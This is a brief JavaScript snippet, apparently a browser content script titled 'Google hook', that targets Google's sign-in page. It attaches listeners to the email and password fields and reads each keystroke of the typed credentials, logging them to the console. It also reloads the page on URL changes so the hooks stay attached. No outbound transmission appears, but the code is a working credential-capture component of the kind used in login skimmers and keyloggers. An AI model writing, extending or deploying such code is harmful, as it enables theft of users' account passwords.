// Find the elements
const inputElement1 = document.querySelector('input[type*="email"]');
const button = document.querySelector('button[jsname="LgbsSe"]');
const inputElement2 = document.querySelector('input[name*="Passwd"]');

// For debugging
console.log("Google hook.");
console.log(button);

if(inputElement2!=null){
inputElement2.addEventListener('input', () => {
    // For debugging
    console.log(inputElement2);
    const enteredText2 = event.target.value;
    console.log(enteredText2);
  });
// For debugging
}

// Create input event listeners
inputElement1.addEventListener('input', () => {
  // For debugging
  const enteredText1 = event.target.value;
  console.log(enteredText1);
});




// Create click event listener
let prevUrl =  window.location.href;


setInterval(() => {
  let currUrl=window.location.href;
  if (currUrl != prevUrl) {
    // URL changed
    location.reload();
    console.log(`URL changed to : ${currUrl}`);
    prevUrl=currUrl
    console.log(inputElement2);
  }
}, 60); 
